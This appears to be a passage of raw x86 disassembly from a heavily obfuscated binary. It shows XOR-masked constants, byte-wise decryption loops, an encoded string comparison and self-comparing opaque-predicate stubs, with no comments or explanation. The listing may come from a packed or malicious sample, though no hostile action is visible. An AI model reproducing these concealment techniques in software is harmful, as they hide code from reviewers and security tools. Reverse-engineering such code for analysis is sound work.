  425fce:	mov    eax,DWORD PTR [ebp-0x38]
  425fd1:	xor    eax,ebx
  425fd3:	add    eax,esi
  425fd5:	mov    DWORD PTR [ebp-0x8],eax
  425fd8:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  425fdf:	mov    DWORD PTR [ebp-0x4c],0xf89c85bc
  425fe6:	mov    eax,DWORD PTR [ebp-0x38]
  425fe9:	mov    ecx,DWORD PTR [ebp-0x28]
  425fec:	xor    eax,ebx
  425fee:	add    eax,esi
  425ff0:	cmp    ecx,eax
  425ff2:	je     0x4261f1
  425ff8:	jmp    0x4261cd
  425ffd:	mov    ecx,DWORD PTR [ebp-0xc]
  426000:	mov    eax,DWORD PTR [ebp-0x28]
  426003:	sub    eax,ecx
  426005:	mov    ecx,DWORD PTR [ebp-0x48]
  426008:	xor    ecx,ebx
  42600a:	add    ecx,esi
  42600c:	xor    edx,edx
  42600e:	div    ecx
  426010:	mov    DWORD PTR [ebp-0x8],eax
  426013:	mov    eax,DWORD PTR [ebp-0x4c]
  426016:	mov    ecx,DWORD PTR [ebp-0x8]
  426019:	xor    eax,ebx
  42601b:	add    eax,esi
  42601d:	cmp    ecx,eax
  42601f:	jbe    0x42602b
  426021:	mov    eax,DWORD PTR [ebp-0x4c]
  426024:	xor    eax,ebx
  426026:	add    eax,esi
  426028:	mov    DWORD PTR [ebp-0x8],eax
  42602b:	mov    eax,DWORD PTR [ebp-0x48]
  42602e:	mov    ecx,DWORD PTR [ebp-0x8]
  426031:	xor    eax,ebx
  426033:	add    eax,esi
  426035:	imul   eax,ecx
  426038:	mov    DWORD PTR [ebp-0x8],eax
  42603b:	mov    eax,DWORD PTR [ebp-0x38]
  42603e:	mov    ecx,DWORD PTR [ebp-0x8]
  426041:	xor    eax,ebx
  426043:	add    eax,esi
  426045:	cmp    ecx,eax
  426047:	je     0x4261bb
  42604d:	mov    eax,DWORD PTR [ebp-0x8]
  426050:	mov    DWORD PTR [ebp-0x14],eax
  426053:	mov    eax,DWORD PTR [ebp-0xc]
  426056:	add    eax,DWORD PTR [ebp-0xd4]
  42605c:	mov    DWORD PTR [ebp-0x20],0xf89c85a5
  426063:	mov    DWORD PTR [ebp-0x34],edi
  426066:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  426070:	mov    DWORD PTR [ebp-0x8],eax
  426073:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  42607a:	mov    DWORD PTR [ebp-0x1c],edi
  42607d:	mov    eax,DWORD PTR [ebp-0x20]
  426080:	xor    eax,ebx
  426082:	add    eax,esi
  426084:	jmp    0x42617a
  426089:	mov    DWORD PTR [ebp-0xe0],0xf89c85b0
  426093:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  42609d:	mov    eax,DWORD PTR [ebp-0x1c]
  4260a0:	mov    ecx,DWORD PTR [ebp-0x44]
  4260a3:	xor    eax,ebx
  4260a5:	add    eax,esi
  4260a7:	imul   eax,ecx
  4260aa:	mov    ecx,DWORD PTR [ebp-0x8]
  4260ad:	mov    al,BYTE PTR [eax+ecx*1]
  4260b0:	mov    BYTE PTR [ebp-0x2],al
  4260b3:	mov    eax,DWORD PTR [ebp-0x1c]
  4260b6:	mov    ecx,DWORD PTR [ebp-0x44]
  4260b9:	xor    eax,ebx
  4260bb:	add    eax,esi
  4260bd:	imul   eax,ecx
  4260c0:	mov    ecx,DWORD PTR [ebp-0xe8]
  4260c6:	xor    ecx,ebx
  4260c8:	add    eax,ecx
  4260ca:	mov    ecx,DWORD PTR [ebp-0x8]
  4260cd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  4260d5:	mov    ecx,DWORD PTR [ebp-0xe0]
  4260db:	xor    ecx,ebx
  4260dd:	lea    eax,[ecx+eax*1+0x3272f1]
  4260e4:	movzx  ecx,BYTE PTR [ebp-0x2]
  4260e8:	xor    ecx,eax
  4260ea:	mov    BYTE PTR [ebp-0x2],cl
  4260ed:	mov    al,BYTE PTR [ebp-0x2]
  4260f0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4260f3:	mov    edx,DWORD PTR [ebp-0x44]
  4260f6:	xor    ecx,ebx
  4260f8:	add    ecx,esi
  4260fa:	imul   ecx,edx
  4260fd:	mov    edx,DWORD PTR [ebp-0x8]
  426100:	mov    BYTE PTR [ecx+edx*1],al
  426103:	mov    eax,DWORD PTR [ebp-0x1c]
  426106:	mov    ecx,DWORD PTR [ebp-0x44]
  426109:	xor    eax,ebx
  42610b:	add    eax,esi
  42610d:	imul   eax,ecx
  426110:	mov    ecx,DWORD PTR [ebp-0x8]
  426113:	mov    al,BYTE PTR [eax+ecx*1]
  426116:	mov    BYTE PTR [ebp-0x2],al
  426119:	mov    eax,DWORD PTR [ebp-0x1c]
  42611c:	mov    ecx,DWORD PTR [ebp-0x44]
  42611f:	xor    eax,ebx
  426121:	add    eax,esi
  426123:	imul   eax,ecx
  426126:	mov    ecx,DWORD PTR [ebp-0x34]
  426129:	xor    ecx,ebx
  42612b:	add    eax,ecx
  42612d:	mov    ecx,DWORD PTR [ebp-0x8]
  426130:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426138:	mov    ecx,DWORD PTR [ebp-0xc4]
  42613e:	xor    ecx,ebx
  426140:	lea    eax,[ecx+eax*1+0x3272f1]
  426147:	movzx  ecx,BYTE PTR [ebp-0x2]
  42614b:	xor    ecx,eax
  42614d:	mov    BYTE PTR [ebp-0x2],cl
  426150:	mov    al,BYTE PTR [ebp-0x2]
  426153:	mov    ecx,DWORD PTR [ebp-0x1c]
  426156:	mov    edx,DWORD PTR [ebp-0x44]
  426159:	xor    ecx,ebx
  42615b:	add    ecx,esi
  42615d:	imul   ecx,edx
  426160:	mov    edx,DWORD PTR [ebp-0x8]
  426163:	mov    BYTE PTR [ecx+edx*1],al
  426166:	mov    eax,DWORD PTR [ebp-0x30]
  426169:	mov    ecx,DWORD PTR [ebp-0x34]
  42616c:	xor    eax,ebx
  42616e:	xor    ecx,ebx
  426170:	add    eax,esi
  426172:	add    ecx,esi
  426174:	imul   eax,ecx
  426177:	add    eax,DWORD PTR [ebp-0x44]
  42617a:	mov    DWORD PTR [ebp-0x44],eax
  42617d:	mov    eax,DWORD PTR [ebp-0x44]
  426180:	mov    ecx,DWORD PTR [ebp-0x14]
  426183:	cmp    ecx,eax
  426185:	jb     0x426089
  42618b:	mov    eax,DWORD PTR [ebp-0x34]
  42618e:	mov    ecx,DWORD PTR [ebp-0x14]
  426191:	xor    eax,ebx
  426193:	add    eax,esi
  426195:	imul   eax,ecx
  426198:	mov    ecx,DWORD PTR [ebp-0x20]
  42619b:	xor    ecx,ebx
  42619d:	add    ecx,esi
  42619f:	or     eax,ecx
  4261a1:	mov    ecx,DWORD PTR [ebp-0x2c]
  4261a4:	xor    ecx,ebx
  4261a6:	add    eax,ecx
  4261a8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4261ab:	xor    ecx,ebx
  4261ad:	add    eax,ecx
  4261af:	mov    ecx,DWORD PTR [ebp-0xc]
  4261b2:	lea    eax,[eax+ecx*1+0x64e5e2]
  4261b9:	jmp    0x4261ca
  4261bb:	mov    eax,DWORD PTR [ebp-0x2c]
  4261be:	mov    ecx,DWORD PTR [ebp-0xc]
  4261c1:	xor    eax,ebx
  4261c3:	lea    eax,[eax+ecx*1+0x3272f1]
  4261ca:	mov    DWORD PTR [ebp-0xc],eax
  4261cd:	mov    eax,DWORD PTR [ebp-0x2c]
  4261d0:	xor    eax,ebx
  4261d2:	mov    ecx,0xffcd8d0f
  4261d7:	sub    ecx,eax
  4261d9:	add    ecx,DWORD PTR [ebp-0x28]
  4261dc:	mov    eax,DWORD PTR [ebp-0x2c]
  4261df:	mov    edx,DWORD PTR [ebp-0xc]
  4261e2:	xor    eax,ebx
  4261e4:	add    eax,esi
  4261e6:	imul   eax,edx
  4261e9:	cmp    eax,ecx
  4261eb:	jbe    0x425ffd
  4261f1:	mov    eax,DWORD PTR [ebp-0x10]
  4261f4:	mov    ecx,DWORD PTR [ebp-0x40]
  4261f7:	mov    eax,DWORD PTR [ebp+0x8]
  4261fa:	mov    edx,DWORD PTR [ebp-0x54]
  4261fd:	mov    eax,DWORD PTR [eax+0x1e0]
  426203:	xor    edx,ebx
  426205:	add    edx,esi
  426207:	push   edx
  426208:	mov    edx,DWORD PTR [ebp-0x3c]
  42620b:	xor    edx,ebx
  42620d:	add    edx,esi
  42620f:	push   edx
  426210:	push   ecx
  426211:	mov    DWORD PTR [ebp-0x30],ecx
  426214:	mov    ecx,DWORD PTR [ebp-0x10]
  426217:	xor    ecx,ebx
  426219:	add    ecx,esi
  42621b:	push   ecx
  42621c:	call   DWORD PTR [eax+0x14]
  42621f:	mov    edi,eax
  426221:	mov    eax,DWORD PTR [ebp-0x10]
  426224:	xor    eax,ebx
  426226:	add    eax,esi
  426228:	cmp    eax,edi
  42622a:	je     0x426285
  42622c:	mov    eax,DWORD PTR [ebp-0x10]
  42622f:	jmp    0x426252
  426231:	mov    ecx,DWORD PTR [ebp-0x24]
  426234:	xor    eax,ebx
  426236:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f1]
  42623d:	mov    BYTE PTR [eax+edi*1+0x3272f1],cl
  426244:	mov    ecx,DWORD PTR [ebp-0x18]
  426247:	xor    ecx,ebx
  426249:	lea    eax,[ecx+eax*1+0x3272f1]
  426250:	xor    eax,ebx
  426252:	mov    ecx,DWORD PTR [ebp-0x40]
  426255:	sub    ecx,esi
  426257:	xor    ecx,ebx
  426259:	cmp    eax,ecx
  42625b:	jne    0x426231
  42625d:	mov    eax,DWORD PTR [ebp+0x8]
  426260:	mov    ecx,DWORD PTR [ebp-0x50]
  426263:	mov    eax,DWORD PTR [eax+0x1e0]
  426269:	xor    ecx,ebx
  42626b:	add    ecx,esi
  42626d:	push   ecx
  42626e:	mov    ecx,DWORD PTR [ebp-0x10]
  426271:	xor    ecx,ebx
  426273:	add    ecx,esi
  426275:	push   ecx
  426276:	push   DWORD PTR [ebp-0x24]
  426279:	call   DWORD PTR [eax+0x18]
  42627c:	mov    eax,DWORD PTR [ebp-0x30]
  42627f:	mov    DWORD PTR [ebp-0x24],edi
  426282:	mov    DWORD PTR [ebp-0x40],eax
  426285:	mov    edi,DWORD PTR [ebp-0x24]
  426288:	mov    eax,DWORD PTR [ebp-0x18]
  42628b:	mov    ecx,DWORD PTR [ebp-0x10]
  42628e:	xor    eax,ebx
  426290:	mov    DWORD PTR [ebp-0x30],edi
  426293:	add    eax,esi
  426295:	mov    DWORD PTR [ebp-0x5c],0x3c2b332b
  42629c:	mov    DWORD PTR [ebp-0x58],0x362b3e2b
  4262a3:	jmp    0x4262d6
  4262a5:	xor    ecx,ebx
  4262a7:	mov    dl,BYTE PTR [ebp+ecx*1+0x327295]
  4262ae:	xor    dl,0x7c
  4262b1:	inc    dl
  4262b3:	mov    DWORD PTR [ebp-0x3c],ecx
  4262b6:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f1]
  4262be:	movzx  edx,dl
  4262c1:	cmp    ecx,edx
  4262c3:	jne    0x4262e0
  4262c5:	mov    ecx,DWORD PTR [ebp-0x18]
  4262c8:	mov    edx,DWORD PTR [ebp-0x3c]
  4262cb:	xor    ecx,ebx
  4262cd:	lea    ecx,[ecx+edx*1+0x3272f1]
  4262d4:	xor    ecx,ebx
  4262d6:	cmp    ecx,0xf89c85bd
  4262dc:	jne    0x4262a5
  4262de:	jmp    0x4262e7
  4262e0:	mov    eax,DWORD PTR [ebp-0x10]
  4262e3:	xor    eax,ebx
  4262e5:	add    eax,esi
  4262e7:	mov    ecx,DWORD PTR [ebp-0x10]
  4262ea:	xor    ecx,ebx
  4262ec:	add    ecx,esi
  4262ee:	cmp    ecx,eax
  4262f0:	je     0x426463
  4262f6:	mov    eax,DWORD PTR [edi+0x8]
  4262f9:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426300:	mov    DWORD PTR [ebp-0x3c],0xf89cc3d4
  426307:	mov    DWORD PTR [ebp-0x48],0xf89cb5a5
  42630e:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  426315:	mov    DWORD PTR [ebp-0x14],eax
  426318:	mov    eax,DWORD PTR [ebp+0x8]
  42631b:	mov    ecx,DWORD PTR [ebp-0x20]
  42631e:	xor    ecx,ebx
  426320:	add    ecx,esi
  426322:	push   ecx
  426323:	mov    ecx,DWORD PTR [ebp-0x48]
  426326:	mov    eax,DWORD PTR [eax+0x1e0]
  42632c:	xor    ecx,ebx
  42632e:	add    ecx,esi
  426330:	push   ecx
  426331:	mov    ecx,DWORD PTR [ebp-0x3c]
  426334:	xor    ecx,ebx
  426336:	add    ecx,esi
  426338:	push   ecx
  426339:	mov    ecx,DWORD PTR [ebp-0xc]
  42633c:	xor    ecx,ebx
  42633e:	add    ecx,esi
  426340:	push   ecx
  426341:	call   DWORD PTR [eax+0x14]
  426344:	mov    edi,eax
  426346:	mov    eax,DWORD PTR [ebp+0x8]
  426349:	mov    ecx,DWORD PTR [ebp-0x20]
  42634c:	mov    eax,DWORD PTR [eax+0x1e0]
  426352:	xor    ecx,ebx
  426354:	add    ecx,esi
  426356:	push   ecx
  426357:	mov    ecx,DWORD PTR [ebp-0x48]
  42635a:	xor    ecx,ebx
  42635c:	add    ecx,esi
  42635e:	push   ecx
  42635f:	mov    ecx,DWORD PTR [ebp-0xc]
  426362:	push   DWORD PTR [ebp-0x14]
  426365:	xor    ecx,ebx
  426367:	add    ecx,esi
  426369:	push   ecx
  42636a:	call   DWORD PTR [eax+0x14]
  42636d:	mov    ecx,DWORD PTR [ebp-0xc]
  426370:	xor    ecx,ebx
  426372:	add    ecx,esi
  426374:	mov    DWORD PTR [ebp-0x20],eax
  426377:	cmp    ecx,edi
  426379:	je     0x426706
  42637f:	mov    ecx,DWORD PTR [ebp-0xc]
  426382:	xor    ecx,ebx
  426384:	add    ecx,esi
  426386:	cmp    ecx,eax
  426388:	je     0x426706
  42638e:	mov    DWORD PTR [ebp-0x3c],0xf89c85b8
  426395:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  42639c:	mov    ecx,DWORD PTR [ebp-0x3c]
  42639f:	xor    cl,0xaa
  4263a2:	sub    cl,0xf
  4263a5:	mov    BYTE PTR [edi],cl
  4263a7:	mov    ecx,DWORD PTR [ebp-0xc]
  4263aa:	xor    cl,0xaa
  4263ad:	sub    cl,0xf
  4263b0:	mov    BYTE PTR [edi+0x1],cl
  4263b3:	mov    ecx,DWORD PTR [ebp-0x54]
  4263b6:	xor    cl,0xaa
  4263b9:	sub    cl,0xf
  4263bc:	mov    BYTE PTR [edi+0x2],cl
  4263bf:	and    DWORD PTR [ebp-0xc8],0x0
  4263c6:	and    DWORD PTR [ebp-0xdc],0x0
  4263cd:	lea    ecx,[ebp-0xdc]
  4263d3:	push   ecx
  4263d4:	push   DWORD PTR [ebp-0x14]
  4263d7:	push   eax
  4263d8:	lea    eax,[ebp-0xc8]
  4263de:	push   eax
  4263df:	mov    eax,DWORD PTR [ebp-0x30]
  4263e2:	push   DWORD PTR [eax+0xc]
  4263e5:	mov    eax,DWORD PTR [ebp-0x24]
  4263e8:	add    eax,0x10
  4263eb:	push   eax
  4263ec:	push   edi
  4263ed:	call   0x425694
  4263f2:	mov    DWORD PTR [ebp-0x3c],eax
  4263f5:	mov    eax,DWORD PTR [ebp+0x8]
  4263f8:	mov    ecx,DWORD PTR [ebp-0x50]
  4263fb:	mov    eax,DWORD PTR [eax+0x1e0]
  426401:	xor    ecx,ebx
  426403:	add    ecx,esi
  426405:	push   ecx
  426406:	mov    ecx,DWORD PTR [ebp-0xc]
  426409:	xor    ecx,ebx
  42640b:	add    ecx,esi
  42640d:	push   ecx
  42640e:	push   edi
  42640f:	call   DWORD PTR [eax+0x18]
  426412:	mov    eax,DWORD PTR [ebp-0x3c]
  426415:	add    eax,0xffcd8d0f
  42641a:	xor    eax,ebx
  42641c:	cmp    eax,0xf89c85a5
  426421:	mov    eax,DWORD PTR [ebp+0x8]
  426424:	mov    eax,DWORD PTR [eax+0x1e0]
  42642a:	mov    ecx,DWORD PTR [ebp-0x50]
  42642d:	jne    0x426450
  42642f:	xor    ecx,ebx
  426431:	add    ecx,esi
  426433:	push   ecx
  426434:	mov    ecx,DWORD PTR [ebp-0xc]
  426437:	xor    ecx,ebx
  426439:	add    ecx,esi
  42643b:	push   ecx
  42643c:	push   DWORD PTR [ebp-0x24]
  42643f:	call   DWORD PTR [eax+0x18]
  426442:	mov    eax,DWORD PTR [ebp-0x20]
  426445:	mov    DWORD PTR [ebp-0x24],eax
  426448:	mov    eax,DWORD PTR [ebp-0x14]
  42644b:	mov    DWORD PTR [ebp-0x40],eax
  42644e:	jmp    0x426463
  426450:	xor    ecx,ebx
  426452:	add    ecx,esi
  426454:	push   ecx
  426455:	mov    ecx,DWORD PTR [ebp-0xc]
  426458:	xor    ecx,ebx
  42645a:	add    ecx,esi
  42645c:	push   ecx
  42645d:	push   DWORD PTR [ebp-0x20]
  426460:	call   DWORD PTR [eax+0x18]
  426463:	mov    eax,DWORD PTR [ebp-0x40]
  426466:	mov    DWORD PTR [ebp-0x38],eax
  426469:	mov    eax,DWORD PTR [ebp-0x24]
  42646c:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  426473:	mov    DWORD PTR [ebp-0x3c],eax
  426476:	mov    edi,0xf89c85ba
  42647b:	mov    DWORD PTR [ebp-0x2c],edi
  42647e:	mov    eax,DWORD PTR [ebp-0x28]
  426481:	xor    eax,ebx
  426483:	add    eax,esi
  426485:	mov    DWORD PTR [ebp-0xc],eax
  426488:	mov    eax,DWORD PTR [ebp-0x28]
  42648b:	xor    eax,ebx
  42648d:	add    eax,esi
  42648f:	mov    DWORD PTR [ebp-0x14],eax
  426492:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  426499:	mov    DWORD PTR [ebp-0x20],0xf89c85bc
  4264a0:	mov    eax,DWORD PTR [ebp-0x28]
  4264a3:	mov    ecx,DWORD PTR [ebp-0x38]
  4264a6:	xor    eax,ebx
  4264a8:	add    eax,esi
  4264aa:	cmp    ecx,eax
  4264ac:	je     0x4266a2
  4264b2:	jmp    0x42667e
  4264b7:	mov    ecx,DWORD PTR [ebp-0xc]
  4264ba:	mov    eax,DWORD PTR [ebp-0x38]
  4264bd:	sub    eax,ecx
  4264bf:	mov    ecx,DWORD PTR [ebp-0x48]
  4264c2:	xor    ecx,ebx
  4264c4:	add    ecx,esi
  4264c6:	xor    edx,edx
  4264c8:	div    ecx
  4264ca:	mov    DWORD PTR [ebp-0x14],eax
  4264cd:	mov    eax,DWORD PTR [ebp-0x20]
  4264d0:	mov    ecx,DWORD PTR [ebp-0x14]
  4264d3:	xor    eax,ebx
  4264d5:	add    eax,esi
  4264d7:	cmp    ecx,eax
  4264d9:	jbe    0x4264e5
  4264db:	mov    eax,DWORD PTR [ebp-0x20]
  4264de:	xor    eax,ebx
  4264e0:	add    eax,esi
  4264e2:	mov    DWORD PTR [ebp-0x14],eax
  4264e5:	mov    eax,DWORD PTR [ebp-0x48]
  4264e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4264eb:	xor    eax,ebx
  4264ed:	add    eax,esi
  4264ef:	imul   eax,ecx
  4264f2:	mov    DWORD PTR [ebp-0x14],eax
  4264f5:	mov    eax,DWORD PTR [ebp-0x28]
  4264f8:	mov    ecx,DWORD PTR [ebp-0x14]
  4264fb:	xor    eax,ebx
  4264fd:	add    eax,esi
  4264ff:	cmp    ecx,eax
  426501:	je     0x42666c
  426507:	mov    eax,DWORD PTR [ebp-0x14]
  42650a:	mov    DWORD PTR [ebp-0x34],eax
  42650d:	mov    eax,DWORD PTR [ebp-0xc]
  426510:	add    eax,DWORD PTR [ebp-0x3c]
  426513:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  42651a:	mov    DWORD PTR [ebp-0x14],edi
  42651d:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  426524:	mov    DWORD PTR [ebp-0x1c],eax
  426527:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  42652e:	mov    DWORD PTR [ebp-0x8],edi
  426531:	mov    eax,DWORD PTR [ebp-0x4c]
  426534:	xor    eax,ebx
  426536:	add    eax,esi
  426538:	jmp    0x42662b
  42653d:	mov    DWORD PTR [ebp-0xe4],0xf89c85b0
  426547:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  426551:	mov    eax,DWORD PTR [ebp-0x8]
  426554:	mov    ecx,DWORD PTR [ebp-0x18]
  426557:	xor    eax,ebx
  426559:	add    eax,esi
  42655b:	imul   eax,ecx
  42655e:	mov    ecx,DWORD PTR [ebp-0x1c]
  426561:	mov    al,BYTE PTR [eax+ecx*1]
  426564:	mov    BYTE PTR [ebp-0x1],al
  426567:	mov    eax,DWORD PTR [ebp-0x8]
  42656a:	mov    ecx,DWORD PTR [ebp-0x18]
  42656d:	xor    eax,ebx
  42656f:	add    eax,esi
  426571:	imul   eax,ecx
  426574:	mov    ecx,DWORD PTR [ebp-0x54]
  426577:	xor    ecx,ebx
  426579:	add    eax,ecx
  42657b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42657e:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426586:	mov    ecx,DWORD PTR [ebp-0xe4]
  42658c:	xor    ecx,ebx
  42658e:	lea    eax,[ecx+eax*1+0x3272f1]
  426595:	movzx  ecx,BYTE PTR [ebp-0x1]
  426599:	xor    ecx,eax
  42659b:	mov    BYTE PTR [ebp-0x1],cl
  42659e:	mov    al,BYTE PTR [ebp-0x1]
  4265a1:	mov    ecx,DWORD PTR [ebp-0x8]
  4265a4:	mov    edx,DWORD PTR [ebp-0x18]
  4265a7:	xor    ecx,ebx
  4265a9:	add    ecx,esi
  4265ab:	imul   ecx,edx
  4265ae:	mov    edx,DWORD PTR [ebp-0x1c]
  4265b1:	mov    BYTE PTR [ecx+edx*1],al
  4265b4:	mov    eax,DWORD PTR [ebp-0x8]
  4265b7:	mov    ecx,DWORD PTR [ebp-0x18]
  4265ba:	xor    eax,ebx
  4265bc:	add    eax,esi
  4265be:	imul   eax,ecx
  4265c1:	mov    ecx,DWORD PTR [ebp-0x1c]
  4265c4:	mov    al,BYTE PTR [eax+ecx*1]
  4265c7:	mov    BYTE PTR [ebp-0x1],al
  4265ca:	mov    eax,DWORD PTR [ebp-0x8]
  4265cd:	mov    ecx,DWORD PTR [ebp-0x18]
  4265d0:	xor    eax,ebx
  4265d2:	add    eax,esi
  4265d4:	imul   eax,ecx
  4265d7:	mov    ecx,DWORD PTR [ebp-0x14]
  4265da:	xor    ecx,ebx
  4265dc:	add    eax,ecx
  4265de:	mov    ecx,DWORD PTR [ebp-0x1c]
  4265e1:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  4265e9:	mov    ecx,DWORD PTR [ebp-0xd0]
  4265ef:	xor    ecx,ebx
  4265f1:	lea    eax,[ecx+eax*1+0x3272f1]
  4265f8:	movzx  ecx,BYTE PTR [ebp-0x1]
  4265fc:	xor    ecx,eax
  4265fe:	mov    BYTE PTR [ebp-0x1],cl
  426601:	mov    al,BYTE PTR [ebp-0x1]
  426604:	mov    ecx,DWORD PTR [ebp-0x8]
  426607:	mov    edx,DWORD PTR [ebp-0x18]
  42660a:	xor    ecx,ebx
  42660c:	add    ecx,esi
  42660e:	imul   ecx,edx
  426611:	mov    edx,DWORD PTR [ebp-0x1c]
  426614:	mov    BYTE PTR [ecx+edx*1],al
  426617:	mov    eax,DWORD PTR [ebp-0x30]
  42661a:	mov    ecx,DWORD PTR [ebp-0x14]
  42661d:	xor    eax,ebx
  42661f:	xor    ecx,ebx
  426621:	add    eax,esi
  426623:	add    ecx,esi
  426625:	imul   eax,ecx
  426628:	add    eax,DWORD PTR [ebp-0x18]
  42662b:	mov    DWORD PTR [ebp-0x18],eax
  42662e:	mov    eax,DWORD PTR [ebp-0x18]
  426631:	mov    ecx,DWORD PTR [ebp-0x34]
  426634:	cmp    ecx,eax
  426636:	jb     0x42653d
  42663c:	mov    eax,DWORD PTR [ebp-0x14]
  42663f:	mov    ecx,DWORD PTR [ebp-0x34]
  426642:	xor    eax,ebx
  426644:	add    eax,esi
  426646:	imul   eax,ecx
  426649:	mov    ecx,DWORD PTR [ebp-0x4c]
  42664c:	xor    ecx,ebx
  42664e:	add    ecx,esi
  426650:	or     eax,ecx
  426652:	mov    ecx,DWORD PTR [ebp-0x2c]
  426655:	xor    ecx,ebx
  426657:	add    eax,ecx
  426659:	mov    ecx,DWORD PTR [ebp-0x2c]
  42665c:	xor    ecx,ebx
  42665e:	add    eax,ecx
  426660:	mov    ecx,DWORD PTR [ebp-0xc]
  426663:	lea    eax,[eax+ecx*1+0x64e5e2]
  42666a:	jmp    0x42667b
  42666c:	mov    eax,DWORD PTR [ebp-0x2c]
  42666f:	mov    ecx,DWORD PTR [ebp-0xc]
  426672:	xor    eax,ebx
  426674:	lea    eax,[eax+ecx*1+0x3272f1]
  42667b:	mov    DWORD PTR [ebp-0xc],eax
  42667e:	mov    eax,DWORD PTR [ebp-0x2c]
  426681:	xor    eax,ebx
  426683:	mov    ecx,0xffcd8d0f
  426688:	sub    ecx,eax
  42668a:	add    ecx,DWORD PTR [ebp-0x38]
  42668d:	mov    eax,DWORD PTR [ebp-0x2c]
  426690:	mov    edx,DWORD PTR [ebp-0xc]
  426693:	xor    eax,ebx
  426695:	add    eax,esi
  426697:	imul   eax,edx
  42669a:	cmp    eax,ecx
  42669c:	jbe    0x4264b7
  4266a2:	push   DWORD PTR [ebp+0x8]
  4266a5:	mov    eax,DWORD PTR [ebp+0x8]
  4266a8:	push   DWORD PTR [eax+0x1cc]
  4266ae:	lea    eax,[ebp-0xd8]
  4266b4:	push   eax
  4266b5:	mov    eax,DWORD PTR [ebp+0x8]
  4266b8:	mov    eax,DWORD PTR [eax+0x1c4]
  4266be:	push   DWORD PTR [eax]
  4266c0:	mov    eax,DWORD PTR [ebp+0x8]
  4266c3:	mov    eax,DWORD PTR [eax+0x1c0]
  4266c9:	push   DWORD PTR [eax]
  4266cb:	push   DWORD PTR [ebp-0x40]
  4266ce:	push   DWORD PTR [ebp-0x24]
  4266d1:	call   0x427168
  4266d6:	mov    DWORD PTR [ebp-0x3c],eax
  4266d9:	mov    eax,DWORD PTR [ebp-0x10]
  4266dc:	mov    ecx,DWORD PTR [ebp-0x24]
  4266df:	xor    eax,ebx
  4266e1:	add    eax,esi
  4266e3:	cmp    eax,ecx
  4266e5:	je     0x426706
  4266e7:	mov    eax,DWORD PTR [ebp+0x8]
  4266ea:	mov    ecx,DWORD PTR [ebp-0x50]
  4266ed:	mov    eax,DWORD PTR [eax+0x1e0]
  4266f3:	xor    ecx,ebx
  4266f5:	add    ecx,esi
  4266f7:	push   ecx
  4266f8:	mov    ecx,DWORD PTR [ebp-0x10]
  4266fb:	xor    ecx,ebx
  4266fd:	add    ecx,esi
  4266ff:	push   ecx
  426700:	push   DWORD PTR [ebp-0x24]
  426703:	call   DWORD PTR [eax+0x18]
  426706:	pop    edi
  426707:	pop    esi
  426708:	pop    ebx
  426709:	leave  
  42670a:	ret    0x4
  42670d:	push   ebp
  42670e:	mov    ebp,esp
  426710:	push   ecx
  426711:	push   ecx
  426712:	lea    eax,[ebp-0x8]
  426715:	mov    DWORD PTR [ebp-0x4],eax
  426718:	push   esi
  426719:	mov    esi,DWORD PTR [ebp-0x4]
  42671c:	mov    eax,0xf881ba2f
  426721:	mov    DWORD PTR [esi],eax
  426723:	mov    esi,DWORD PTR [ebp-0x8]
  426726:	cmp    esi,eax
  426728:	pop    esi
  426729:	jne    0x426733
  42672b:	mov    BYTE PTR [ecx+0xa],0x83
  42672f:	mov    BYTE PTR [edx+0x8],0x2e
  426733:	mov    BYTE PTR [edx+0xa],0x83
  426737:	mov    BYTE PTR [ecx+0x2],0x11
  42673b:	leave  
  42673c:	ret    
  42673d:	push   ebp
  42673e:	mov    ebp,esp
  426740:	push   ecx
  426741:	push   ecx
  426742:	lea    eax,[ebp-0x8]
  426745:	mov    DWORD PTR [ebp-0x4],eax
  426748:	mov    edx,DWORD PTR [ebp-0x4]
  42674b:	mov    eax,0xf88b0bc3
  426750:	mov    DWORD PTR [edx],eax
  426752:	mov    edx,DWORD PTR [ebp-0x8]
  426755:	cmp    edx,eax
  426757:	jne    0x426768
  426759:	mov    eax,DWORD PTR [ebp+0x8]
  42675c:	mov    BYTE PTR [ecx+0x9],0xf
  426760:	mov    BYTE PTR [eax+0x7],0x56
  426764:	mov    BYTE PTR [ecx+0x6],0xe
  426768:	mov    BYTE PTR [ecx+0x3],0x1f
  42676c:	leave  
  42676d:	ret    0x4
  426770:	push   ebp
  426771:	mov    ebp,esp
  426773:	push   ecx
  426774:	push   ecx
  426775:	lea    eax,[ebp-0x8]
  426778:	mov    DWORD PTR [ebp-0x4],eax
  42677b:	mov    edx,DWORD PTR [ebp-0x4]
  42677e:	mov    eax,0x7e0da2f
  426783:	mov    DWORD PTR [edx],eax
  426785:	mov    edx,DWORD PTR [ebp-0x8]
  426788:	cmp    edx,eax
  42678a:	jne    0x426790
  42678c:	mov    BYTE PTR [ecx+0x7],0x56
  426790:	mov    eax,DWORD PTR [ebp+0x8]
  426793:	mov    BYTE PTR [ecx+0x1],0x14
  426797:	mov    BYTE PTR [eax+0x9],0x2f
  42679b:	leave  
  42679c:	ret    0x4
  42679f:	push   ebp
  4267a0:	mov    ebp,esp
  4267a2:	push   ecx
  4267a3:	push   ecx
  4267a4:	lea    eax,[ebp-0x8]
  4267a7:	mov    DWORD PTR [ebp-0x4],eax
  4267aa:	push   esi
  4267ab:	mov    esi,DWORD PTR [ebp-0x4]
